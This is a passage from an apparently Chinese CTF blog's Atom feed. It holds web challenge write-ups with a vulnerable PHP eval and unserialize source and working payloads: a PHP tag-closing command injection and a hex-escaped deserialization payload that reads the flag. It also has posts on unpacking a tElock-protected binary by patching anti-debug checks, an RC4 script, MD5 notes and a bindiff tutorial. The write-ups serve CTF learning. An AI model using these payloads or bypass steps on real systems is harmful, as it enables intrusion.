class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//一片森林里分出两条路————而我选择了人迹更少的一条，从此决定了我一生的道路。</span><br><span class="hljs-title function_ invoke__">Include</span>(<span class="hljs-string">&#x27;check.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$A</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;easy&#x27;</span>];<br><span class="hljs-variable">$B</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hard&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$A</span>))&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;e&#x27;</span>.<span class="hljs-string">&#x27;x&#x27;</span>.<span class="hljs-string">&#x27;i&#x27;</span>.<span class="hljs-string">&#x27;t&#x27;</span>.<span class="hljs-string">&#x27;(); ?&gt;&#x27;</span>.<span class="hljs-variable">$A</span>.<span class="hljs-string">&#x27;&lt;?php ;&#x27;</span>);<span class="hljs-comment">//这条路没有任何过滤诶，是不是好走一些</span><br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$B</span>))&#123;<br><span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$B</span>);<span class="hljs-comment">//要被正则了，嘤嘤嘤</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;#cmd&quot;</span>.<span class="hljs-variable">$B</span>.<span class="hljs-string">&quot;inject&quot;</span>);<span class="hljs-comment">//这条路怎么还要禁我东西啊，真下头</span><br>&#125;<br></code></pre></td></tr></table></figure><p>先用hard走 hard&#x3D;system，不过会显示passthru和system被禁用了，使用?&gt;反引号加闭合?hard&#x3D;?&gt;&lt;?php echo `id`;?&gt;(这个不是引号，这个是反引号)<br>这个时候id就是可以执行得命令有点感觉是将前面得过滤，重新插了一个新得php进来执行完成绕过<br>尝试一下easy，好像会直接结束，方式就是在hard过滤</p><h3 id="Maxser-Revenge"><a href="#Maxser-Revenge" class="headerlink" title="Maxser Revenge"></a>Maxser Revenge</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br> <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br> <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;check.php&#x27;</span>);<br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">passthru</span></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$S</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$dir</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-variable language_">$this</span>-&gt;dir=<span class="hljs-string">&#x27;notion&#x27;</span>;<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;S);<br> &#125;<br> &#125;<br> <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NSS&#x27;</span>];<br> <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$a</span>);<br> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>一道反序列化题目,我们尝试简单构建pop链，发现存在过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">passthru</span>();<br><span class="hljs-variable">$a</span>-&gt;S=<span class="hljs-string">&quot;system(&#x27;ls /&#x27;)&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br>    O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;passthru&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;S&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;system(&#x27;ls /&#x27;)&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;dir&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/fogpost/photo/raw/master/202411041446655.png" srcset="/img/loading.gif" lazyload><br>利用passthru过滤，转换成16进制来过滤</p><blockquote><p>passthru(“cat &#x2F;f*”)这个转化成16进制不会产生字母<br>70 61 73 73 74 68 72 75 28 22 63 61 74 20 2F 66 2A 22 29<br>2f和2a换成&#x2F;和<em>这两个直接用<br>O:8:”passthru”:2:{s:1:”S”;S:20:”\70\61\73\73\74\68\72\75\28\22\63\61\74\20&#x2F;\66</em>\22\29;”;s:3:”dir”;N;}直接修改，并用大写S来支持字符串得编码</p></blockquote><h3 id="The-future-Revenge"><a href="#The-future-Revenge" class="headerlink" title="The future Revenge"></a>The future Revenge</h3><p>考点CVE-2024-2961<br><a href="https://blog.csdn.net/jennycisp/article/details/140148391">https://blog.csdn.net/jennycisp/article/details/140148391</a><br><a href="https://err0r233.github.io/posts/28510.html">https://err0r233.github.io/posts/28510.html</a> (要梯子)</p><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>点击后就是这个界面<br><img src="https://gitee.com/fogpost/photo/raw/master/202411071924871.png" srcset="/img/loading.gif" lazyload><br>我们点击sign,最后一个博客地址判断存在ssrf<br><img src="https://gitee.com/fogpost/photo/raw/master/202411071925412.png" srcset="/img/loading.gif" lazyload><br>我们查看源码,index.php、submit.php、save_user.php、show_blog.php,存在这么几个文件<br><img src="https://gitee.com/fogpost/photo/raw/master/202411071927695.png" srcset="/img/loading.gif" lazyload><br>这个好像涉及ssrf了,本人不是很懂,现在先暂停一下,之后补上来</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;nssctf2024秋季回顾&quot;&gt;&lt;a href=&quot;#nssctf2024秋季回顾&quot; class=&quot;headerlink&quot; title=&quot;nssctf2024秋季回顾&quot;&gt;&lt;/a&gt;nssctf2024秋季回顾&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;</summary>
      
    
    
    
    <category term="CTF" scheme="https://fogpost.top/categories/CTF/"/>
    
    
    <category term="ctf" scheme="https://fogpost.top/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>od脱壳脚本的使用与编写</title>
    <link href="https://fogpost.top/2024/10/29/od%E8%84%B1%E5%A3%B3%E8%84%9A%E6%9C%AC%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%BC%96%E5%86%99/"/>
    <id>https://fogpost.top/2024/10/29/od%E8%84%B1%E5%A3%B3%E8%84%9A%E6%9C%AC%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%BC%96%E5%86%99/</id>
    <published>2024-10-29T14:44:22.000Z</published>
    <updated>2024-11-15T07:52:59.902Z</updated>
    
    <content type="html"><![CDATA[<h1 id="od脱壳脚本的使用与编写"><a href="#od脱壳脚本的使用与编写" class="headerlink" title="od脱壳脚本的使用与编写"></a>od脱壳脚本的使用与编写</h1><p>我们的软件取自<a href="https://www.52pojie.cn/thread-422100-1-1.html">52破解</a><br>第一步查壳，并且丢到idapro中看看有什么<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292248198.png" srcset="/img/loading.gif" lazyload><br>可见这个软件是由tElock压缩过的<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292249831.png" srcset="/img/loading.gif" lazyload><br>Idapro也是不负众望的啥也没扫出来，我们od加载一下，这里注意看一下内存加载，基地址是400000，这代表了我们关闭了ALSR这点对我们后面的脱壳很重要<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292251590.png" srcset="/img/loading.gif" lazyload><br>在单步运行到这里时，我们程序会直接跑飞<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292253699.png" srcset="/img/loading.gif" lazyload><br>下断点键入后，逐步步过，发现出现下面这个弹窗，表示本程序是有程序自校验，这里有两个方法，一是找到自校验方式nop掉，二是在每次键入时将断点取消，这也是一个好习惯<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292254330.png" srcset="/img/loading.gif" lazyload><br>看下图发现，此程序还有对调试器的检测，我们这里开启了od的内核插件，但是好像在win10不起作用，没有防止检测，可以选择用win7，来加载<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292303768.png" srcset="/img/loading.gif" lazyload><br>我们重新加载文件，在此处发现对od检测的jmp函数我们将这个函数进行nop即可正常进入软件<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292321969.png" srcset="/img/loading.gif" lazyload><br>如果刚刚没有nop那么我们在下面这个图便会跳转到exitprocess进程结束<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292321971.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;od脱壳脚本的使用与编写&quot;&gt;&lt;a href=&quot;#od脱壳脚本的使用与编写&quot; class=&quot;headerlink&quot; title=&quot;od脱壳脚本的使用与编写&quot;&gt;&lt;/a&gt;od脱壳脚本的使用与编写&lt;/h1&gt;&lt;p&gt;我们的软件取自&lt;a href=&quot;https://www.52</summary>
      
    
    
    
    <category term="逆向" scheme="https://fogpost.top/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="reverse" scheme="https://fogpost.top/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>rc4</title>
    <link href="https://fogpost.top/2024/10/28/rc4/"/>
    <id>https://fogpost.top/2024/10/28/rc4/</id>
    <published>2024-10-28T13:13:17.000Z</published>
    <updated>2024-10-28T13:18:01.293Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><p>写题过程中会出现像rc4这种简单的对称加密算法，在此留下对应的解密脚本<br>由于初始化的s盒和产生的密钥流是由固定的密钥确定，并且加密的本质是异或所以为对称的<br>rc4加密主要分为三个部分</p><ul><li>初始化s盒</li><li>生成密钥流</li><li>加密</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">KSA</span>(<span class="hljs-params">key</span>):<br>    key_length = <span class="hljs-built_in">len</span>(key)<br><br>    <span class="hljs-comment"># 初始化S盒</span><br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % key_length]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    <span class="hljs-keyword">return</span> S<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">PRGA</span>(<span class="hljs-params">S</span>):<br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        K = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        <span class="hljs-keyword">yield</span> K<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">RC4</span>(<span class="hljs-params">key, data</span>):<br>    S = KSA(key)<br>    keystream = PRGA(S)<br>    res = []<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> data:<br>        res.append(c ^ <span class="hljs-built_in">next</span>(keystream))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(res)<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;RC4&quot;&gt;&lt;a href=&quot;#RC4&quot; class=&quot;headerlink&quot; title=&quot;RC4&quot;&gt;&lt;/a&gt;RC4&lt;/h1&gt;&lt;p&gt;写题过程中会出现像rc4这种简单的对称加密算法，在此留下对应的解密脚本&lt;br&gt;由于初始化的s盒和产生的密钥流是由固定的密钥确定，并且</summary>
      
    
    
    
    <category term="逆向算法" scheme="https://fogpost.top/categories/%E9%80%86%E5%90%91%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="reverse" scheme="https://fogpost.top/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>hash</title>
    <link href="https://fogpost.top/2024/10/28/hash/"/>
    <id>https://fogpost.top/2024/10/28/hash/</id>
    <published>2024-10-28T11:36:46.000Z</published>
    <updated>2024-10-28T13:21:27.574Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hash算法"><a href="#hash算法" class="headerlink" title="hash算法"></a>hash算法</h1><p>打算了解一下各个hash算法的细节，防止在看到伪代码时不认识</p><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><h3 id="MD5加密原理步骤"><a href="#MD5加密原理步骤" class="headerlink" title="MD5加密原理步骤"></a>MD5加密原理步骤</h3><ol><li>在MD5算法中，首先需要对信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行(N*512+448)</li><li>初始化变量,以大端字节序来表示，他们分别为： A&#x3D;0x01234567，B&#x3D;0x89ABCDEF，C&#x3D;0xFEDCBA98，D&#x3D;0x76543210（每一个变量给出的数值是高字节存于内存低地址，低字节存于内存高地址，即大端字节序。在程序中变量A、B、C、D的值分别为0x67452301，0xEFCDAB89，0x98BADCFE，0x10325476）</li><li>处理分组数据<br>以下是每次操作中用到的四个非线性函数（每轮一个）。<br>F( X ,Y ,Z ) &#x3D; ( X &amp; Y ) | ( (<del>X) &amp; Z )<br>G( X ,Y ,Z ) &#x3D; ( X &amp; Z ) | ( Y &amp; (</del>Z) )<br>H( X ,Y ,Z ) &#x3D;X ^ Y ^ Z<br>I( X ,Y ,Z ) &#x3D;Y ^ ( X | (~Z) )</li></ol><ul><li>MD5 是一种基于迭代和压缩的哈希函数，其核心是对输入数据进行多轮的位运算和逻辑操作。</li><li>常量值：MD5 使用特定的常量（如 0x67452301, 0xEFCDAB89 等）在计算过程中。如果在代码中看到这些特定的常量，特别是在加法操作中，通常指向 MD5 或类似算法。</li><li>处理输入数据的方式：MD5 通常处理输入数据为 512 位（64 字节）块，将每个块分为多个 32 位（4 字节）单元进行处理。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;hash算法&quot;&gt;&lt;a href=&quot;#hash算法&quot; class=&quot;headerlink&quot; title=&quot;hash算法&quot;&gt;&lt;/a&gt;hash算法&lt;/h1&gt;&lt;p&gt;打算了解一下各个hash算法的细节，防止在看到伪代码时不认识&lt;/p&gt;
&lt;h2 id=&quot;MD5&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="逆向算法" scheme="https://fogpost.top/categories/%E9%80%86%E5%90%91%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="reverse" scheme="https://fogpost.top/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>bindiff</title>
    <link href="https://fogpost.top/2024/10/28/bindiff/"/>
    <id>https://fogpost.top/2024/10/28/bindiff/</id>
    <published>2024-10-28T06:58:37.000Z</published>
    <updated>2024-10-28T07:37:25.610Z</updated>
    
    <content type="html"><![CDATA[<h1 id="用bindiff来显示二进制文件的区别"><a href="#用bindiff来显示二进制文件的区别" class="headerlink" title="用bindiff来显示二进制文件的区别"></a>用bindiff来显示二进制文件的区别</h1><p>你是否在面对收到攻击的二进制文件无法比对，看着两个文件而陷入迷茫，不知如何分析，沉沦在函数之海无法自拔，找不到patcher前后的区别，那么bindiff可以帮助你。</p><h3 id="1-自行安装"><a href="#1-自行安装" class="headerlink" title="1. 自行安装"></a>1. 自行安装</h3><h3 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h3><p>首先我们打开一个我们所需要分析的软件，在ida完成分析之后我们退出将对应的.ida64包文件保存，然后加载patcher后的文件，在ida中键入crtl+6，使用bindiff插件<br><img src="https://gitee.com/fogpost/photo/raw/master/202410281503232.png" srcset="/img/loading.gif" lazyload><br>选择Diff DAtabase，选择刚刚保存的.ida64文件,出现对应的对比框<br><img src="https://gitee.com/fogpost/photo/raw/master/202410281504805.png" srcset="/img/loading.gif" lazyload><br>在这个绿色框口下我们发现，在最下方的函数extract_dirs_from_files，与原来的文件对比，有仅0.84的相似度，我们便可以知道两个二进制文件在这个函数发生了区别<br><img src="https://gitee.com/fogpost/photo/raw/master/202410281506283.png" srcset="/img/loading.gif" lazyload><br>查看函数,在patcher中发现多了如下一个分支</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++">LABEL_7:<br>        <span class="hljs-keyword">if</span> ( v9 &amp;&amp; !v9[<span class="hljs-number">1</span>] )<br>        &#123;<br>          *(_QWORD *)&amp;lmao[<span class="hljs-number">8</span>] = <span class="hljs-number">0x3F7D132A2A252822LL</span>;<br>          *(_QWORD *)lmao = <span class="hljs-number">0x7D2E370A180F1604LL</span>;<br>          *(_QWORD *)&amp;lmao[<span class="hljs-number">24</span>] = <span class="hljs-number">0x31207C7C381320LL</span>;<br>          *(_QWORD *)&amp;lmao[<span class="hljs-number">16</span>] = <span class="hljs-number">0x392A7F3F39132D13LL</span>;<br>          v18 = lmao;<br>          <span class="hljs-keyword">do</span><br>            *v18++ ^= **(_BYTE **)v7;<br>          <span class="hljs-keyword">while</span> ( &amp;lmao[<span class="hljs-number">31</span>] != v18 );<br>          <span class="hljs-built_in">puts</span>(lmao);<br>        &#125;<br>        <span class="hljs-keyword">goto</span> LABEL_9;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( !dirname )<br>        <span class="hljs-keyword">goto</span> LABEL_21;<br>      component = <span class="hljs-built_in">last_component</span>(*(<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)v7);<br>      <span class="hljs-keyword">if</span> ( *component == <span class="hljs-number">46</span> )<br>      &#123;<br>        v17 = component[(component[<span class="hljs-number">1</span>] == <span class="hljs-number">46</span>) + <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">if</span> ( !v17 || v17 == <span class="hljs-number">47</span> )<br>          <span class="hljs-keyword">goto</span> LABEL_7;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( *v9 == <span class="hljs-number">47</span> )<br>      &#123;<br></code></pre></td></tr></table></figure><p>我们经过cyberchef的函数爆破，来获得最终的数据，注意在数组中存在大小端序的问题<br><img src="https://gitee.com/fogpost/photo/raw/master/202410281511684.png" srcset="/img/loading.gif" lazyload><br><a href="https://www.nssctf.cn/problem/3687">题目来源</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;用bindiff来显示二进制文件的区别&quot;&gt;&lt;a href=&quot;#用bindiff来显示二进制文件的区别&quot; class=&quot;headerlink&quot; title=&quot;用bindiff来显示二进制文件的区别&quot;&gt;&lt;/a&gt;用bindiff来显示二进制文件的区别&lt;/h1&gt;&lt;p&gt;你是</summary>
      
    
    
    
    <category term="ctf" scheme="https://fogpost.top/categories/ctf/"/>
    
    
    <category term="tool" scheme="https://fogpost.top/tags/tool/"/>
    
  </entry>
  
</feed>
